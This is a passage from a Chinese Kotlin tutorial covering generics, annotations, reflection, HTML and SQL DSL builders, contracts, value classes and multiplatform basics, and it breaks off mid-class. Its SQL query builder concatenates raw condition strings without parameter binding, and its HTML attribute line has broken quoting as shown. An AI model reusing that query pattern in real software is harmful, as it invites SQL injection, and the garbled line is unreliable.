                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>太棒了！现在让我们进入 Kotlin 更深入的高级特性和实际应用场景。这部分将涵盖<strong>泛型、注解、反射、DSL</strong>等企业级开发必备技能。</p>
<hr/>
<h3 data-id="heading-0"><strong>Kotlin 高级特性：企业级开发实战</strong></h3>
<h4 data-id="heading-1"><strong>三十二、泛型深入：型变、星投影与 reified</strong></h4>
<h5 data-id="heading-2"><strong>1. 型变（Variance）</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 不变（Invariant）- 默认行为</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>&lt;<span class="hljs-type">T</span>&gt;(<span class="hljs-keyword">val</span> value: T)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> stringBox = Box(<span class="hljs-string">"Hello"</span>)
    <span class="hljs-comment">// val anyBox: Box&lt;Any&gt; = stringBox // 错误！Box&lt;String&gt; 不是 Box&lt;Any&gt; 的子类型</span>
}

<span class="hljs-comment">// 协变（Covariant）- 使用 out 关键字</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ReadOnlyBox</span>&lt;<span class="hljs-type">out T</span>&gt;(<span class="hljs-keyword">val</span> value: T) {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">get</span><span class="hljs-params">()</span></span>: T = value
    <span class="hljs-comment">// fun set(newValue: T) {} // 错误！不能有消费 T 的方法</span>
}

<span class="hljs-comment">// 逆变（Contravariant）- 使用 in 关键字</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WriteOnlyBox</span>&lt;<span class="hljs-type">in T</span>&gt; {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">set</span><span class="hljs-params">(value: <span class="hljs-type">T</span>)</span></span> {
        println(<span class="hljs-string">"设置值: <span class="hljs-variable">$value</span>"</span>)
    }
    <span class="hljs-comment">// fun get(): T // 错误！不能有生产 T 的方法</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testVariance</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 协变示例</span>
    <span class="hljs-keyword">val</span> stringBox: ReadOnlyBox&lt;String&gt; = ReadOnlyBox(<span class="hljs-string">"Text"</span>)
    <span class="hljs-keyword">val</span> anyBox: ReadOnlyBox&lt;Any&gt; = stringBox <span class="hljs-comment">// 正确！因为 out 关键字</span>
    
    <span class="hljs-comment">// 逆变示例</span>
    <span class="hljs-keyword">val</span> anyWriteBox: WriteOnlyBox&lt;Any&gt; = WriteOnlyBox()
    <span class="hljs-keyword">val</span> stringWriteBox: WriteOnlyBox&lt;String&gt; = anyWriteBox <span class="hljs-comment">// 正确！因为 in 关键字</span>
}
</code></pre>
<h5 data-id="heading-3"><strong>2. 星投影（Star Projection）</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">printSize</span><span class="hljs-params">(list: <span class="hljs-type">List</span>&lt;*&gt;)</span></span> {
    println(<span class="hljs-string">"列表大小: <span class="hljs-subst">${list.size}</span>"</span>)
    <span class="hljs-comment">// println(list[0]) // 不能安全地访问元素内容</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">compareFirstSecond</span><span class="hljs-params">(list: <span class="hljs-type">List</span>&lt;<span class="hljs-type">T</span>&gt;, comparator: <span class="hljs-type">Comparator</span>&lt;<span class="hljs-type">in</span> <span class="hljs-type">T</span>&gt;)</span></span>: <span class="hljs-built_in">Boolean</span> 
    <span class="hljs-keyword">where</span> T : Comparable&lt;T&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (list.size &gt;= <span class="hljs-number">2</span>) {
        comparator.compare(list[<span class="hljs-number">0</span>], list[<span class="hljs-number">1</span>]) &gt; <span class="hljs-number">0</span>
    } <span class="hljs-keyword">else</span> <span class="hljs-literal">false</span>
}

<span class="hljs-comment">// 使用 reified 关键字实现类型检查</span>
<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T&gt;</span> <span class="hljs-title">checkType</span><span class="hljs-params">(value: <span class="hljs-type">Any</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> value <span class="hljs-keyword">is</span> T
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> list = listOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
    printSize(list)
    
    println(checkType&lt;String&gt;(<span class="hljs-string">"Hello"</span>)) <span class="hljs-comment">// true</span>
    println(checkType&lt;<span class="hljs-built_in">Int</span>&gt;(<span class="hljs-string">"Hello"</span>))    <span class="hljs-comment">// false</span>
}
</code></pre>
<h4 data-id="heading-4"><strong>三十三、注解与反射</strong></h4>
<h5 data-id="heading-5"><strong>1. 自定义注解</strong></h5>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 定义注解</span>
<span class="hljs-variable">@Target</span>(AnnotationTarget.CLASS, AnnotationTarget.FUNCTION)
<span class="hljs-variable">@Retention</span>(AnnotationRetention.RUNTIME)
annotation class <span class="hljs-built_in">ApiVersion</span>(val <span class="hljs-attribute">version</span>: String)

<span class="hljs-variable">@Target</span>(AnnotationTarget.PROPERTY)
annotation class JsonExclude

<span class="hljs-variable">@Target</span>(AnnotationTarget.PROPERTY)
annotation class <span class="hljs-built_in">JsonName</span>(val <span class="hljs-attribute">name</span>: String)

<span class="hljs-comment">// 使用注解</span>
<span class="hljs-variable">@ApiVersion</span>(<span class="hljs-string">"1.0"</span>)
data class <span class="hljs-built_in">User</span>(
    <span class="hljs-variable">@JsonName</span>(<span class="hljs-string">"user_name"</span>)
    val <span class="hljs-attribute">name</span>: String,
    
    val <span class="hljs-attribute">age</span>: Int,
    
    <span class="hljs-variable">@JsonExclude</span>
    val <span class="hljs-attribute">password</span>: String
)

<span class="hljs-comment">// 注解处理器模拟</span>
fun <span class="hljs-built_in">processAnnotations</span>(<span class="hljs-attribute">obj</span>: Any) {
    <span class="hljs-selector-tag">val</span> <span class="hljs-selector-tag">klass</span> = <span class="hljs-selector-tag">obj</span>::<span class="hljs-selector-tag">class</span>
    <span class="hljs-selector-tag">val</span> <span class="hljs-selector-tag">apiVersion</span> = <span class="hljs-selector-tag">klass</span><span class="hljs-selector-class">.annotations</span><span class="hljs-selector-class">.find</span> { <span class="hljs-selector-tag">it</span> <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">ApiVersion</span> } <span class="hljs-selector-tag">as</span>? <span class="hljs-selector-tag">ApiVersion</span>
    <span class="hljs-selector-tag">apiVersion</span>?<span class="hljs-selector-class">.let</span> { <span class="hljs-selector-tag">println</span>(<span class="hljs-string">"API 版本: ${it.version}"</span>) }
    
    <span class="hljs-selector-tag">klass</span><span class="hljs-selector-class">.memberProperties</span><span class="hljs-selector-class">.forEach</span> { <span class="hljs-selector-tag">prop</span> <span class="hljs-selector-tag">-</span>&gt;
        <span class="hljs-selector-tag">prop</span><span class="hljs-selector-class">.annotations</span><span class="hljs-selector-class">.forEach</span> { <span class="hljs-selector-tag">annotation</span> <span class="hljs-selector-tag">-</span>&gt;
            <span class="hljs-keyword">when</span> (annotation) {
                <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">JsonName</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">println</span>(<span class="hljs-string">"属性 ${prop.name} 将被序列化为 ${annotation.name}"</span>)
                <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">JsonExclude</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">println</span>(<span class="hljs-string">"属性 ${prop.name} 将被排除"</span>)
            }
        }
    }
}
</code></pre>
<h5 data-id="heading-6"><strong>2. 反射实战</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlin.reflect.full.*
<span class="hljs-keyword">import</span> kotlin.reflect.jvm.isAccessible

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SecretClass</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> secretValue = <span class="hljs-string">"机密信息"</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">secretMethod</span><span class="hljs-params">()</span></span> = <span class="hljs-string">"机密方法"</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">publicMethod</span><span class="hljs-params">()</span></span> = <span class="hljs-string">"公开方法"</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">reflectExample</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> instance = SecretClass()
    <span class="hljs-keyword">val</span> klass = instance::<span class="hljs-keyword">class</span>
    
    <span class="hljs-title class_">println</span>(<span class="hljs-string">"=== 类信息 ==="</span>)
    println(<span class="hljs-string">"类名: <span class="hljs-subst">${klass.simpleName}</span>"</span>)
    println(<span class="hljs-string">"成员属性: <span class="hljs-subst">${klass.memberProperties.map { it.name }</span>}"</span>)
    println(<span class="hljs-string">"成员函数: <span class="hljs-subst">${klass.memberFunctions.map { it.name }</span>}"</span>)
    
    println(<span class="hljs-string">"\n=== 访问私有成员 ==="</span>)
    <span class="hljs-comment">// 访问私有属性</span>
    <span class="hljs-keyword">val</span> secretProperty = klass.memberProperties.find { it.name == <span class="hljs-string">"secretValue"</span> }
    secretProperty?.let {
        it.isAccessible = <span class="hljs-literal">true</span>
        println(<span class="hljs-string">"私有属性值: <span class="hljs-subst">${it.get(instance)}</span>"</span>)
    }
    
    <span class="hljs-comment">// 调用私有方法</span>
    <span class="hljs-keyword">val</span> secretMethod = klass.memberFunctions.find { it.name == <span class="hljs-string">"secretMethod"</span> }
    secretMethod?.let {
        it.isAccessible = <span class="hljs-literal">true</span>
        println(<span class="hljs-string">"私有方法结果: <span class="hljs-subst">${it.call(instance)}</span>"</span>)
    }
}
</code></pre>
<h4 data-id="heading-7"><strong>三十四、类型安全的构建器（DSL）</strong></h4>
<h5 data-id="heading-8"><strong>1. HTML DSL 构建器</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HtmlElement</span>(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> content: String = <span class="hljs-string">""</span>) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> children = mutableListOf&lt;HtmlElement&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> attributes = mutableMapOf&lt;String, String&gt;()
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">attribute</span><span class="hljs-params">(name: <span class="hljs-type">String</span>, value: <span class="hljs-type">String</span>)</span></span> {
        attributes[name] = value
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">child</span><span class="hljs-params">(element: <span class="hljs-type">HtmlElement</span>)</span></span> {
        children.add(element)
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">val</span> attrString = <span class="hljs-keyword">if</span> (attributes.isNotEmpty()) {
            <span class="hljs-string">" "</span> + attributes.entries.joinToString(<span class="hljs-string">" "</span>) { <span class="hljs-string">"<span class="hljs-subst">${it.key}</span>="</span>${it.value}<span class="hljs-string">""</span> }
        } <span class="hljs-keyword">else</span> <span class="hljs-string">""</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (children.isEmpty()) {
            <span class="hljs-string">"&lt;<span class="hljs-variable">$name</span><span class="hljs-variable">$attrString</span>&gt;<span class="hljs-variable">$content</span>&lt;/<span class="hljs-variable">$name</span>&gt;"</span>
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-string">"&lt;<span class="hljs-variable">$name</span><span class="hljs-variable">$attrString</span>&gt;<span class="hljs-subst">${children.joinToString(<span class="hljs-string">""</span>)}</span><span class="hljs-variable">$content</span>&lt;/<span class="hljs-variable">$name</span>&gt;"</span>
        }
    }
}

<span class="hljs-comment">// DSL 构建函数</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">html</span><span class="hljs-params">(block: <span class="hljs-type">HtmlBuilder</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span>: HtmlElement {
    <span class="hljs-keyword">val</span> builder = HtmlBuilder(<span class="hljs-string">"html"</span>)
    builder.block()
    <span class="hljs-keyword">return</span> builder.build()
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">HtmlBuilder</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> rootName: String) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> root = HtmlElement(rootName)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> currentElement: HtmlElement = root
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">head</span><span class="hljs-params">(block: <span class="hljs-type">HeadBuilder</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        <span class="hljs-keyword">val</span> headBuilder = HeadBuilder()
        headBuilder.block()
        root.child(headBuilder.build())
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">body</span><span class="hljs-params">(block: <span class="hljs-type">BodyBuilder</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        <span class="hljs-keyword">val</span> bodyBuilder = BodyBuilder()
        bodyBuilder.block()
        root.child(bodyBuilder.build())
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: HtmlElement = root
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">HeadBuilder</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> head = HtmlElement(<span class="hljs-string">"head"</span>)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">title</span><span class="hljs-params">(text: <span class="hljs-type">String</span>)</span></span> {
        head.child(HtmlElement(<span class="hljs-string">"title"</span>, text))
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: HtmlElement = head
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BodyBuilder</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> body = HtmlElement(<span class="hljs-string">"body"</span>)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">h1</span><span class="hljs-params">(text: <span class="hljs-type">String</span>, block: <span class="hljs-type">H1Builder</span>.() -&gt; <span class="hljs-type">Unit</span> = {})</span></span> {
        <span class="hljs-keyword">val</span> h1Builder = H1Builder(text)
        h1Builder.block()
        body.child(h1Builder.build())
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">p</span><span class="hljs-params">(text: <span class="hljs-type">String</span>)</span></span> {
        body.child(HtmlElement(<span class="hljs-string">"p"</span>, text))
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: HtmlElement = body
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">H1Builder</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> text: String) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> h1 = HtmlElement(<span class="hljs-string">"h1"</span>, text)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">style</span><span class="hljs-params">(css: <span class="hljs-type">String</span>)</span></span> {
        h1.attribute(<span class="hljs-string">"style"</span>, css)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: HtmlElement = h1
}

<span class="hljs-comment">// 使用 DSL</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createHtmlPage</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> page = html {
        head {
            title(<span class="hljs-string">"我的网页"</span>)
        }
        body {
            h1(<span class="hljs-string">"欢迎来到 Kotlin DSL"</span>) {
                style(<span class="hljs-string">"color: blue;"</span>)
            }
            p(<span class="hljs-string">"这是一个使用 DSL 构建的 HTML 页面"</span>)
        }
    }
    
    println(page)
}
</code></pre>
<h5 data-id="heading-9"><strong>2. 数据库查询 DSL</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 查询 DSL 定义</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">QueryBuilder</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> table: String = <span class="hljs-string">""</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> conditions = mutableListOf&lt;String&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> limit: <span class="hljs-built_in">Int</span>? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> orderBy: String? = <span class="hljs-literal">null</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">from</span><span class="hljs-params">(table: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">this</span>.table = table
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">where</span><span class="hljs-params">(condition: <span class="hljs-type">String</span>)</span></span> {
        conditions.add(condition)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">limit</span><span class="hljs-params">(count: <span class="hljs-type">Int</span>)</span></span> {
        <span class="hljs-keyword">this</span>.limit = count
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">orderBy</span><span class="hljs-params">(column: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">this</span>.orderBy = column
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">val</span> query = StringBuilder(<span class="hljs-string">"SELECT * FROM <span class="hljs-variable">$table</span>"</span>)
        
        <span class="hljs-keyword">if</span> (conditions.isNotEmpty()) {
            query.append(<span class="hljs-string">" WHERE "</span>).append(conditions.joinToString(<span class="hljs-string">" AND "</span>))
        }
        
        orderBy?.let {
            query.append(<span class="hljs-string">" ORDER BY <span class="hljs-variable">$it</span>"</span>)
        }
        
        limit?.let {
            query.append(<span class="hljs-string">" LIMIT <span class="hljs-variable">$it</span>"</span>)
        }
        
        <span class="hljs-keyword">return</span> query.toString()
    }
}

<span class="hljs-comment">// DSL 入口函数</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">query</span><span class="hljs-params">(block: <span class="hljs-type">QueryBuilder</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span>: String {
    <span class="hljs-keyword">val</span> builder = QueryBuilder()
    builder.block()
    <span class="hljs-keyword">return</span> builder.build()
}

<span class="hljs-comment">// 使用 DSL 构建查询</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">buildQueries</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> simpleQuery = query {
        from(<span class="hljs-string">"users"</span>)
    }
    println(<span class="hljs-string">"简单查询: <span class="hljs-variable">$simpleQuery</span>"</span>)
    
    <span class="hljs-keyword">val</span> complexQuery = query {
        from(<span class="hljs-string">"orders"</span>)
        <span class="hljs-keyword">where</span>(<span class="hljs-string">"status = 'completed'"</span>)
        <span class="hljs-keyword">where</span>(<span class="hljs-string">"amount &gt; 100"</span>)
        orderBy(<span class="hljs-string">"created_at DESC"</span>)
        limit(<span class="hljs-number">10</span>)
    }
    println(<span class="hljs-string">"复杂查询: <span class="hljs-variable">$complexQuery</span>"</span>)
}
</code></pre>
<h4 data-id="heading-10"><strong>三十五、合约（Contracts）与内联优化</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlin.contracts.*

<span class="hljs-comment">// 使用合约优化智能转换</span>
<span class="hljs-meta">@OptIn(ExperimentalContracts::class)</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> String?.<span class="hljs-title">isNotNullOrEmpty</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    contract {
        returns(<span class="hljs-literal">true</span>) implies (<span class="hljs-keyword">this</span><span class="hljs-symbol">@isNotNullOrEmpty</span> != <span class="hljs-literal">null</span>)
    }
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span> != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-keyword">this</span>.isNotEmpty()
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processText</span><span class="hljs-params">(text: <span class="hljs-type">String</span>?)</span></span> {
    <span class="hljs-keyword">if</span> (text.isNotNullOrEmpty()) {
        <span class="hljs-comment">// 由于合约，编译器知道 text 不为 null</span>
        println(text.length) <span class="hljs-comment">// 不需要安全调用</span>
        println(text.uppercase())
    }
}

<span class="hljs-comment">// 内联类 - 包装类型而不产生运行时开销</span>
<span class="hljs-meta">@JvmInline</span>
value <span class="hljs-keyword">class</span> <span class="hljs-title class_">Password</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> value: String) {
    <span class="hljs-keyword">init</span> {
        require(value.length &gt;= <span class="hljs-number">8</span>) { <span class="hljs-string">"密码必须至少8个字符"</span> }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">mask</span><span class="hljs-params">()</span></span>: String = <span class="hljs-string">"*"</span>.repeat(value.length)
}

<span class="hljs-meta">@JvmInline</span>
value <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserId</span>(<span class="hljs-keyword">val</span> value: <span class="hljs-built_in">Int</span>)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">login</span><span class="hljs-params">(userId: <span class="hljs-type">UserId</span>, password: <span class="hljs-type">Password</span>)</span></span> {
    println(<span class="hljs-string">"用户 <span class="hljs-subst">${userId.value}</span> 登录，密码: <span class="hljs-subst">${password.mask()}</span>"</span>)
}
</code></pre>
<h4 data-id="heading-11"><strong>三十六、多平台项目（KMP）基础</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 公共模块 - 共享业务逻辑</span>
<span class="hljs-keyword">expect</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Platform</span>() {
    <span class="hljs-keyword">val</span> platform: String
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Greeting</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> platform = Platform()
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">greet</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello from <span class="hljs-subst">${platform.platform}</span>"</span>
    }
}

<span class="hljs-comment">// Android 实现</span>
<span class="hljs-comment">// androidMain/Platform.kt</span>
<span class="hljs-keyword">actual</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Platform</span> <span class="hljs-title">actual</span> <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> platform: String = <span class="hljs-string">"Android"</span>
}

<span class="hljs-comment">// iOS 实现  </span>
<span class="hljs-comment">// iosMain/Platform.kt</span>
<span class="hljs-keyword">actual</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Platform</span> <span class="hljs-title">actual</span> <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">actual</span> <span class="hljs-keyword">val</span> platform: String = <span class="hljs-string">"iOS"</span>
}

<span class="hljs-comment">// 共享业务逻辑</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">add</span><span class="hljs-params">(a: <span class="hljs-type">Int</span>, b: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span> = a + b
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">multiply</span><span class="hljs-params">(a: <span class="hljs-type">Int</span>, b: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span> = a * b
    
